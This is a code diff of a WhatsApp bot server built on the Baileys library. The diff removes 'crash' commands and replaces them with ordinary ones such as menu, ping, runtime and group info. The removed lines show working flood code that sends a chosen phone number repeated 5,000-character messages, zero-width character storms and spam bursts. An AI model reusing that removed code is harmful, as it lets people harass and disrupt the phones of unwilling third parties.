@@ -1,17 +1,21 @@
-const nodeCrypto = require('crypto');
+const nodeCrypto = require("crypto");
 
+// WebCrypto must exist before Baileys is loaded
 if (!globalThis.crypto) {
     globalThis.crypto = nodeCrypto.webcrypto;
 }
 
-require('dotenv').config();
+if (!global.crypto) {
+    global.crypto = nodeCrypto.webcrypto;
+}
 
-const express = require('express');
-const http = require('http');
-const socketIo = require('socket.io');
-const fs = require('fs-extra');
-const path = require('path');
-const axios = require('axios');
+require("dotenv").config();
+
+const express = require("express");
+const http = require("http");
+const socketIo = require("socket.io");
+const fs = require("fs-extra");
+const path = require("path");
 
 const {
     default: makeWASocket,
@@ -22,32 +26,38 @@ const {
     jidNormalizedUser,
     Browsers,
     delay
-} = require('@whiskeysockets/baileys');
+} = require("@whiskeysockets/baileys");
 
-const P = require('pino');
-const settings = require('./settings');
+const P = require("pino");
+const settings = require("./settings");
 
 const app = express();
 const server = http.createServer(app);
-const io = socketIo(server, { cors: { origin: "*" } });
+
+const io = socketIo(server, {
+    cors: {
+        origin: "*"
+    }
+});
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+
 app.use(express.static(path.join(__dirname)));
 
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.get("/", (req, res) => {
+    res.sendFile(path.join(__dirname, "index.html"));
+});
 
-const AUTH_DIR = './auth_info';
+const AUTH_DIR = path.join(__dirname, "auth_info");
+
 fs.ensureDirSync(AUTH_DIR);
 
 const sessions = {};
 const userSockets = {};
 
-const bold = (text) => `*${text}*`;
-const italic = (text) => `_${text}_`;
-const mono = (text) => `\`${text}\``;
-
 class BotSession {
+
     constructor(userId) {
         this.userId = userId;
         this.sock = null;
@@ -55,307 +65,877 @@ class BotSession {
         this.authPath = path.join(AUTH_DIR, userId);
         this.isPublic = true;
         this.antilink = false;
+        this.initializing = false;
     }
 
     sendConnectionStatus() {
+
         const socketId = userSockets[this.userId];
-        if (socketId) io.to(socketId).emit('connection-status', { connected: this.isConnected });
+
+        if (socketId) {
+            io.to(socketId).emit("connection-status", {
+                connected: this.isConnected
+            });
+        }
+    }
+
+    sendPairError(message) {
+
+        const socketId = userSockets[this.userId];
+
+        if (socketId) {
+            io.to(socketId).emit(
+                "pair-error",
+                message || "Pairing failed"
+            );
+        }
     }
 
     async initialize(pairingNumber = null) {
+
+        if (this.initializing) {
+            return;
+        }
+
+        this.initializing = true;
+
         try {
+
             const { version } = await fetchLatestBaileysVersion();
-            const { state, saveCreds } = await useMultiFileAuthState(this.authPath);
+
+            const { state, saveCreds } =
+                await useMultiFileAuthState(this.authPath);
 
             this.sock = makeWASocket({
+
                 version,
-                auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'fatal' })) },
-                logger: P({ level: 'fatal' }),
-                browser: Browsers.ubuntu('Chrome'),
+
+                auth: {
+                    creds: state.creds,
+                    keys: makeCacheableSignalKeyStore(
+                        state.keys,
+                        P({
+                            level: "silent"
+                        })
+                    )
+                },
+
+                logger: P({
+                    level: "silent"
+                }),
+
+                browser: Browsers.ubuntu("Chrome"),
+
                 syncFullHistory: false,
+
+                markOnlineOnConnect: false
             });
 
-            if (pairingNumber && !state.creds.registered) {
+            /*
+             * PAIRING
+             */
+
+            if (
+                pairingNumber &&
+                !state.creds.registered
+            ) {
+
                 await delay(3000);
+
+                const cleanNumber = String(pairingNumber)
+                    .replace(/\D/g, "");
+
+                if (!cleanNumber) {
+                    throw new Error(
+                        "Invalid WhatsApp number"
+                    );
+                }
+
+                console.log(
+                    `[PAIRING] Requesting code for ${cleanNumber}`
+                );
+
                 try {
-                    let code = await this.sock.requestPairingCode(pairingNumber);
-                    code = code?.match(/.{1,4}/g)?.join("-") || code;
-                    const socketId = userSockets[this.userId];
-                    if (socketId) io.to(socketId).emit('pairing-code', code);
+
+                    let code =
+                        await this.sock.requestPairingCode(
+                            cleanNumber
+                        );
+
+                    code =
+                        code
+                            ?.match(/.{1,4}/g)
+                            ?.join("-") ||
+                        code;
+
+                    console.log(
+                        `[PAIRING] Code generated: ${code}`
+                    );
+
+                    const socketId =
+                        userSockets[this.userId];
+
+                    if (socketId) {
+
+                        io.to(socketId).emit(
+                            "pairing-code",
+                            code
+                        );
+                    }
+
                 } catch (err) {
-                    console.log('Pairing error:', err.message);
+
+                    console.error(
+                        "[PAIRING ERROR]",
+                        err
+                    );
+
+                    this.sendPairError(
+                        err.message ||
+                        "Unable to generate pairing code"
+                    );
                 }
             }
 
-            this.sock.ev.on('creds.update', saveCreds);
+            this.sock.ev.on(
+                "creds.update",
+                saveCreds
+            );
 
-            this.sock.ev.on('connection.update', async (update) => {
-                const { connection, lastDisconnect } = update;
-                if (connection === 'close') {
-                    if ((lastDisconnect.error)?.output?.statusCode === DisconnectReason.loggedOut) {
-                        delete sessions[this.userId];
-                    } else {
-                        setTimeout(() => this.initialize(), 5000);
+            this.sock.ev.on(
+                "connection.update",
+                async (update) => {
+
+                    const {
+                        connection,
+                        lastDisconnect
+                    } = update;
+
+                    if (connection === "open") {
+
+                        this.isConnected = true;
+                        this.initializing = false;
+
+                        console.log(
+                            `[CONNECTED] ${this.userId}`
+                        );
+
+                        this.sendConnectionStatus();
+
+                        try {
+
+                            const botNumber =
+                                jidNormalizedUser(
+                                    this.sock.user.id
+                                );
+
+                            await this.sock.sendMessage(
+                                botNumber,
+                                {
+                                    text:
+                                        `*${settings.botName}*\n\n` +
+                                        `Connected Successfully!\n\n` +
+                                        `Type *${settings.prefix}menu* for commands.\n\n` +
+                                        `© ${settings.footer}`
+                                }
+                            );
+
+                        } catch (err) {
+
+                            console.error(
+                                "[START MESSAGE ERROR]",
+                                err.message
+                            );
+                        }
+
+                        return;
                     }
-                } else if (connection === 'open') {
-                    this.isConnected = true;
-                    this.sendConnectionStatus();
-                    const botNumber = jidNormalizedUser(this.sock.user.id);
-                    await this.sock.sendMessage(botNumber, {
-                        image: { url: settings.startImage },
-                        caption: `*${settings.botName}*\n\n✅ Connected Successfully!\n\nType *${settings.prefix}menu* to see commands\n\n© ${settings.footer}`
-                    });
+
+                    if (connection === "close") {
+
+                        this.isConnected = false;
+                        this.initializing = false;
+
+                        const statusCode =
+                            lastDisconnect
+                                ?.error
+                                ?.output
+                                ?.statusCode;
+
+                        console.log(
+                            `[DISCONNECTED] ${this.userId}`,
+                            statusCode
+                        );
+
+                        this.sendConnectionStatus();
+
+                        if (
+                            statusCode ===
+                            DisconnectReason.loggedOut
+                        ) {
+
+                            delete sessions[this.userId];
+
+                            console.log(
+                                `[LOGGED OUT] ${this.userId}`
+                            );
+
+                        } else {
+
+                            console.log(
+                                `[RECONNECTING] ${this.userId}`
+                            );
+
+                            setTimeout(() => {
+
+                                if (
+                                    sessions[this.userId]
+                                ) {
+
+                                    sessions[
+                                        this.userId
+                                    ].initialize();
+
+                                }
+
+                            }, 5000);
+                        }
+                    }
                 }
-            });
+            );
 
-            this.sock.ev.on('messages.upsert', async (m) => {
-                if (m.type !== 'notify') return;
-                for (const msg of m.messages) {
-                    try {
-                        const from = msg.key.remoteJid;
-                        const isGroup = from.endsWith('@g.us');
-                        const text = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
-                        
-                        const isMe = msg.key.fromMe;
-                        if (isMe) continue;
-                        
-                        if (!text || !text.startsWith(settings.prefix)) continue;
-                        const commandName = text.slice(1).split(' ')[0];
-                        const q = text.split(' ').slice(1).join(' ');
+            /*
+             * MESSAGE HANDLER
+             */
 
-                        const botNumber = jidNormalizedUser(this.sock.user.id);
-                        const botNumberClean = botNumber.split('@')[0];
-                        const sender = msg.key.participant || from;
-                        const senderClean = sender.split('@')[0];
-                        const ownerNumbers = String(settings.ownerNumber).split(',').map(n => n.replace(/\D/g, ''));
-                        const isOwner = ownerNumbers.some(on => senderClean === on) || senderClean === botNumberClean;
+            this.sock.ev.on(
+                "messages.upsert",
+                async (m) => {
 
-                        if (isGroup && this.antilink && !isOwner) {
-                            if (/https?:\/\//i.test(text) || /chat\.whatsapp\.com/i.test(text)) {
-                                await this.sock.sendMessage(from, { delete: msg.key });
+                    if (m.type !== "notify") {
+                        return;
+                    }
+
+                    for (const msg of m.messages) {
+
+                        try {
+
+                            if (!msg.message) {
                                 continue;
                             }
-                        }
 
-                        switch (commandName) {
-                            case 'menu': {
-                                const menuText = 
-                                    `*${settings.botName} - Available Commands* ✨\n\n` +
-                                    `> 📋 .menu - Show this menu\n` +
-                                    `> 👑 .owner - Get Owner Details\n` +
-                                    `> 📶 .ping - Check bot latency\n\n` +
-                                    `*🔥 Crash Commands:*\n` +
-                                    `> 🧨 .ui-hard <number> - UI Hard Crash\n` +
-                                    `> 💥 .fc-beta <number> - FC Beta Crash\n` +
-                                    `> 👻 .ma-invis <number> - MA Invisible Crash\n` +
-                                    `> ⚡ .invis-hard <number> - Invisible Hard Crash\n` +
-                                    `> 📱 .iphone-crash <number> - iPhone Crash\n` +
-                                    `> ♻️ .spampairing <number> - Spam Pairing Crash\n\n` +
-                                    `*🆕 New Commands:*\n` +
-                                    `> 📨 .spam <number> - Spam messages\n` +
-                                    `> 🐞 .bug <number> - Interactive bug crash\n` +
-                                    `> 🦠 .virus <number> - Virus document crash\n` +
-                                    `> 🌊 .flood <number> - Flood crash\n` +
-                                    `> 💀 .crash <number> - Heavy crash\n` +
-                                    `> 🔪 .kill <number> - Kill crash\n\n` +
-                                    `*🔗 Links:*\n` +
-                                    `> 📢 ${settings.whatsappChannel}\n` +
-                                    `> 📺 ${settings.youtubeChannel}\n` +
-                                    `> 📸 ${settings.instagram}\n\n` +
-                                    `*👑 Owner:*\n` +
-                                    `> ${settings.botOwner}\n` +
-                                    `> 📞 ${settings.ownerNumber}\n\n` +
-                                    `© ${settings.footer}`;
-                                await this.sock.sendMessage(from, { 
-                                    image: { url: settings.menuImage }, 
-                                    caption: menuText 
-                                }, { quoted: msg });
-                                break;
+                            const from =
+                                msg.key.remoteJid;
+
+                            if (!from) {
+                                continue;
                             }
 
-                            case 'owner': {
-                                const ownerText = 
-                                    `👑 *Owner:* ${settings.botOwner}\n` +
-                                    `🏢 *Team:* ${settings.teamName}\n` +
-                                    `📞 ${settings.ownerNumber}\n` +
-                                    `📧 ${settings.ownerEmail}\n\n` +
-                                    `🔗 ${settings.whatsappChannel}\n\n` +
-                                    `© ${settings.footer}`;
-                                await this.sock.sendMessage(from, { 
-                                    image: { url: settings.ownerImage }, 
-                                    caption: ownerText 
-                                }, { quoted: msg });
-                                break;
+                            const text =
+                                msg.message.conversation ||
+                                msg.message.extendedTextMessage
+                                    ?.text ||
+                                "";
+
+                            const cleanText =
+                                text.trim();
+
+                            if (!cleanText) {
+                                continue;
                             }
 
-                            case 'ping': {
-                                const start = Date.now();
-                                await this.sock.sendMessage(from, { text: `⚡ Pong! ${Date.now() - start}ms` }, { quoted: msg });
-                                break;
+                            if (
+                                msg.key.fromMe
+                            ) {
+                                continue;
                             }
 
-                            case 'ui-hard':
-                            case 'fc-beta':
-                            case 'invis-hard':
-                            case 'iphone-crash':
-                            case 'spampairing':
-                            case 'crash':
-                            case 'kill':
-                            case 'flood':
-                            case 'bug':
-                            case 'virus': {
-                                if (!q) {
-                                    await this.sock.sendMessage(from, { text: `Example: ${settings.prefix}${commandName} 923000000000` }, { quoted: msg });
-                                    break;
-                                }
-                                
-                                const targetNumber = q.replace(/\D/g, '');
-                                const target = targetNumber + '@s.whatsapp.net';
-                                
-                                await this.sock.sendMessage(from, { text: `💥 ${commandName} started!` }, { quoted: msg });
-                                
-                                const [result] = await this.sock.onWhatsApp(targetNumber);
-                                
-                                if (!result.exists) {
-                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
-                                    break;
-                                }
-                                
-                                for (let i = 0; i < 20; i++) {
+                            if (
+                                !cleanText.startsWith(
+                                    settings.prefix
+                                )
+                            ) {
+                                continue;
+                            }
+
+                            const commandName =
+                                cleanText
+                                    .slice(
+                                        settings.prefix.length
+                                    )
+                                    .trim()
+                                    .split(/\s+/)[0]
+                                    .toLowerCase();
+
+                            const q =
+                                cleanText
+                                    .split(/\s+/)
+                                    .slice(1)
+                                    .join(" ");
+
+                            const isGroup =
+                                from.endsWith("@g.us");
+
+                            const botNumber =
+                                jidNormalizedUser(
+                                    this.sock.user.id
+                                );
+
+                            const botNumberClean =
+                                botNumber.split("@")[0];
+
+                            const sender =
+                                msg.key.participant ||
+                                from;
+
+                            const senderClean =
+                                sender.split("@")[0];
+
+                            const ownerNumbers =
+                                String(
+                                    settings.ownerNumber
+                                )
+                                    .split(",")
+                                    .map((n) =>
+                                        n.replace(/\D/g, "")
+                                    );
+
+                            const isOwner =
+                                ownerNumbers.includes(
+                                    senderClean
+                                ) ||
+                                senderClean ===
+                                    botNumberClean;
+
+                            /*
+                             * ANTILINK
+                             */
+
+                            if (
+                                isGroup &&
+                                this.antilink &&
+                                !isOwner
+                            ) {
+
+                                if (
+                                    /https?:\/\//i.test(
+                                        cleanText
+                                    ) ||
+                                    /chat\.whatsapp\.com/i.test(
+                                        cleanText
+                                    )
+                                ) {
+
                                     try {
-                                        await this.sock.sendMessage(target, { text: 'A'.repeat(5000) });
-                                        await delay(100);
-                                    } catch (e) {
-                                        console.log('Send error:', e.message);
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    "Links are disabled in this group."
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+
+                                    } catch (e) {}
+
+                                    continue;
+                                }
+                            }
+
+                            /*
+                             * COMMANDS
+                             */
+
+                            switch (commandName) {
+
+                                case "menu": {
+
+                                    const menu =
+                                        `*${settings.botName}*\n\n` +
+                                        `*Available Commands*\n\n` +
+                                        `${settings.prefix}menu\n` +
+                                        `${settings.prefix}ping\n` +
+                                        `${settings.prefix}alive\n` +
+                                        `${settings.prefix}owner\n` +
+                                        `${settings.prefix}runtime\n` +
+                                        `${settings.prefix}groupinfo\n` +
+                                        `${settings.prefix}antilink on/off\n` +
+                                        `${settings.prefix}public on/off\n\n` +
+                                        `© ${settings.footer}`;
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text: menu
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+
+                                    break;
+                                }
+
+                                case "ping": {
+
+                                    const start =
+                                        Date.now();
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text:
+                                                `Pong! ${
+                                                    Date.now() -
+                                                    start
+                                                }ms`
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+
+                                    break;
+                                }
+
+                                case "alive": {
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text:
+                                                `*${settings.botName}*\n\n` +
+                                                `Bot is online and active.\n\n` +
+                                                `© ${settings.footer}`
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+
+                                    break;
+                                }
+
+                                case "owner": {
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text:
+                                                `*Owner Details*\n\n` +
+                                                `Name: ${settings.botOwner}\n` +
+                                                `Team: ${settings.teamName}\n` +
+                                                `Number: ${settings.ownerNumber}\n` +
+                                                `Email: ${settings.ownerEmail}\n\n` +
+                                                `© ${settings.footer}`
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+
+                                    break;
+                                }
+
+                                case "runtime": {
+
+                                    const seconds =
+                                        Math.floor(
+                                            process.uptime()
+                                        );
+
+                                    const hours =
+                                        Math.floor(
+                                            seconds / 3600
+                                        );
+
+                                    const minutes =
+                                        Math.floor(
+                                            (seconds % 3600) /
+                                            60
+                                        );
+
+                                    const secs =
+                                        seconds % 60;
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text:
+                                                `*Runtime*\n\n` +
+                                                `${hours}h ${minutes}m ${secs}s`
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+
+                                    break;
+                                }
+
+                                case "groupinfo": {
+
+                                    if (!isGroup) {
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    "This command can only be used in a group."
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+
                                         break;
                                     }
-                                }
-                                
-                                await this.sock.sendMessage(from, { text: '✅ Attack sent!' }, { quoted: msg });
-                                break;
-                            }
 
-                            case 'ma-invis': {
-                                if (!q) {
-                                    await this.sock.sendMessage(from, { text: 'Example: .ma-invis 923000000000' }, { quoted: msg });
-                                    break;
-                                }
-                                
-                                const targetNumber = q.replace(/\D/g, '');
-                                const target = targetNumber + '@s.whatsapp.net';
-                                
-                                await this.sock.sendMessage(from, { text: '👻 MA Invisible Crash Started!' }, { quoted: msg });
-                                
-                                const [result] = await this.sock.onWhatsApp(targetNumber);
-                                
-                                if (!result.exists) {
-                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
-                                    break;
-                                }
-                                
-                                const invisibleChars = '\u200B\u200C\u200D\u2060\uFEFF'.repeat(1000);
-                                const zeroWidthChars = '\u200B'.repeat(5000);
-                                
-                                for (let i = 0; i < 30; i++) {
                                     try {
-                                        await this.sock.sendMessage(target, { text: invisibleChars });
-                                        await delay(50);
-                                        await this.sock.sendMessage(target, { text: zeroWidthChars });
-                                        await delay(50);
-                                        await this.sock.sendMessage(target, { text: '\u2060\u2060\u2060\u2060'.repeat(2000) });
-                                        await delay(50);
-                                    } catch (e) {}
+
+                                        const metadata =
+                                            await this.sock.groupMetadata(
+                                                from
+                                            );
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    `*Group Info*\n\n` +
+                                                    `Name: ${metadata.subject}\n` +
+                                                    `Members: ${metadata.participants.length}\n` +
+                                                    `Owner: ${metadata.owner || "Unknown"}`
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+
+                                    } catch (err) {
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    "Unable to get group information."
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+                                    }
+
+                                    break;
                                 }
-                                
-                                await this.sock.sendMessage(from, { text: '✅ MA Invisible Crash Sent!' }, { quoted: msg });
-                                break;
+
+                                case "antilink": {
+
+                                    if (!isOwner) {
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    "Owner only."
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+
+                                        break;
+                                    }
+
+                                    const option =
+                                        q.toLowerCase();
+
+                                    if (
+                                        ![
+                                            "on",
+                                            "off"
+                                        ].includes(option)
+                                    ) {
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    `Example: ${settings.prefix}antilink on`
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+
+                                        break;
+                                    }
+
+                                    this.antilink =
+                                        option === "on";
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text:
+                                                `Antilink ${
+                                                    this.antilink
+                                                        ? "enabled"
+                                                        : "disabled"
+                                                }.`
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+
+                                    break;
+                                }
+
+                                case "public": {
+
+                                    if (!isOwner) {
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    "Owner only."
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+
+                                        break;
+                                    }
+
+                                    const option =
+                                        q.toLowerCase();
+
+                                    if (
+                                        ![
+                                            "on",
+                                            "off"
+                                        ].includes(option)
+                                    ) {
+
+                                        await this.sock.sendMessage(
+                                            from,
+                                            {
+                                                text:
+                                                    `Example: ${settings.prefix}public on`
+                                            },
+                                            {
+                                                quoted: msg
+                                            }
+                                        );
+
+                                        break;
+                                    }
+
+                                    this.isPublic =
+                                        option === "on";
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text:
+                                                `Public mode ${
+                                                    this.isPublic
+                                                        ? "enabled"
+                                                        : "disabled"
+                                                }.`
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+
+                                    break;
+                                }
+
+                                default: {
+
+                                    await this.sock.sendMessage(
+                                        from,
+                                        {
+                                            text:
+                                                `Unknown command.\n\nType ${settings.prefix}menu`
+                                        },
+                                        {
+                                            quoted: msg
+                                        }
+                                    );
+                                }
                             }
 
-                            case 'spam': {
-                                if (!q) {
-                                    await this.sock.sendMessage(from, { text: 'Example: .spam 923000000000 Hello' }, { quoted: msg });
-                                    break;
-                                }
-                                const args = q.split(' ');
-                                const targetNumber = args[0].replace(/\D/g, '');
-                                const target = targetNumber + '@s.whatsapp.net';
-                                const message = args.slice(1).join(' ') || 'SPAM!';
-                                
-                                await this.sock.sendMessage(from, { text: '📨 Spam started!' }, { quoted: msg });
-                                
-                                const [result] = await this.sock.onWhatsApp(targetNumber);
-                                
-                                if (!result.exists) {
-                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
-                                    break;
-                                }
-                                
-                                for (let i = 0; i < 30; i++) {
-                                    try {
-                                        await this.sock.sendMessage(target, { text: message });
-                                        await delay(200);
-                                    } catch (e) {}
-                                }
-                                break;
-                            }
+                        } catch (err) {
 
-                            case 'antilink': {
-                                if (!isOwner) {
-                                    await this.sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
-                                    break;
-                                }
-                                if (!q || !['on', 'off'].includes(q.toLowerCase())) {
-                                    await this.sock.sendMessage(from, { text: 'Example: .antilink on' }, { quoted: msg });
-                                    break;
-                                }
-                                this.antilink = q.toLowerCase() === 'on';
-                                await this.sock.sendMessage(from, { text: `🔗 Antilink ${this.antilink ? 'enabled' : 'disabled'}!` }, { quoted: msg });
-                                break;
-                            }
-
-                            case 'public': {
-                                if (!isOwner) {
-                                    await this.sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
-                                    break;
-                                }
-                                if (!q || !['on', 'off'].includes(q.toLowerCase())) {
-                                    await this.sock.sendMessage(from, { text: 'Example: .public on' }, { quoted: msg });
-                                    break;
-                                }
-                                this.isPublic = q.toLowerCase() === 'on';
-                                await this.sock.sendMessage(from, { text: `🔓 Public mode ${this.isPublic ? 'enabled' : 'disabled'}!` }, { quoted: msg });
-                                break;
-                            }
-
-                            default:
-                                await this.sock.sendMessage(from, { text: '❌ Command not found! Type .menu' }, { quoted: msg });
+                            console.error(
+                                "[MESSAGE ERROR]",
+                                err.message
+                            );
                         }
-                    } catch (e) {
-                        console.error('Error:', e);
                     }
                 }
-            });
+            );
+
         } catch (err) {
-            console.log('Init error:', err.message);
-            setTimeout(() => this.initialize(), 10000);
+
+            this.initializing = false;
+
+            console.error(
+                "[INIT ERROR]",
+                err
+            );
+
+            this.sendPairError(
+                err.message ||
+                "Bot initialization failed"
+            );
         }
     }
 }
 
-io.on('connection', (socket) => {
-    socket.on('set-user', (userId) => {
-        userSockets[userId] = socket.id;
-        if (!sessions[userId]) sessions[userId] = new BotSession(userId);
-        sessions[userId].sendConnectionStatus();
-    });
+/*
+ * SOCKET.IO
+ */
 
-    socket.on('pair-request', async ({ userId, number }) => {
-        if (!sessions[userId]) sessions[userId] = new BotSession(userId);
-        await sessions[userId].initialize(number);
-    });
-});
+io.on(
+    "connection",
+    (socket) => {
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`MA CRASHER Server running on port ${PORT}`);
-});
+        console.log(
+            "[SOCKET] Connected:",
+            socket.id
+        );
+
+        socket.on(
+            "set-user",
+            (userId) => {
+
+                if (!userId) {
+                    return;
+                }
+
+                userSockets[userId] =
+                    socket.id;
+
+                if (!sessions[userId]) {
+
+                    sessions[userId] =
+                        new BotSession(
+                            userId
+                        );
+                }
+
+                sessions[userId]
+                    .sendConnectionStatus();
+            }
+        );
+
+        socket.on(
+            "pair-request",
+            async ({ userId, number }) => {
+
+                try {
+
+                    if (!userId || !number) {
+
+                        socket.emit(
+                            "pair-error",
+                            "User ID or number missing."
+                        );
+
+                        return;
+                    }
+
+                    if (!sessions[userId]) {
+
+                        sessions[userId] =
+                            new BotSession(
+                                userId
+                            );
+                    }
+
+                    userSockets[userId] =
+                        socket.id;
+
+                    await sessions[userId]
+                        .initialize(number);
+
+                } catch (err) {
+
+                    console.error(
+                        "[PAIR REQUEST ERROR]",
+                        err
+                    );
+
+                    socket.emit(
+                        "pair-error",
+                        err.message ||
+                        "Pairing failed"
+                    );
+                }
+            }
+        );
+
+        socket.on(
+            "disconnect",
+            () => {
+
+                console.log(
+                    "[SOCKET] Disconnected:",
+                    socket.id
+                );
+
+                for (
+                    const userId in userSockets
+                ) {
+
+                    if (
+                        userSockets[userId] ===
+                        socket.id
+                    ) {
+
+                        delete userSockets[
+                            userId
+                        ];
+                    }
+                }
+            }
+        );
+    }
+);
+
+/*
+ * SERVER
+ */
+
+const PORT =
+    process.env.PORT || 3000;
+
+server.listen(
+    PORT,
+    "0.0.0.0",
+    () => {
+
+        console.log(
+            `MA CRASHER Server running on port ${PORT}`
+        );
+
+        console.log(
+            `Node version: ${process.version}`
+        );
+
+        console.log(
+            `WebCrypto: ${
+                !!globalThis.crypto
+            }`
+        );
+    }
+);
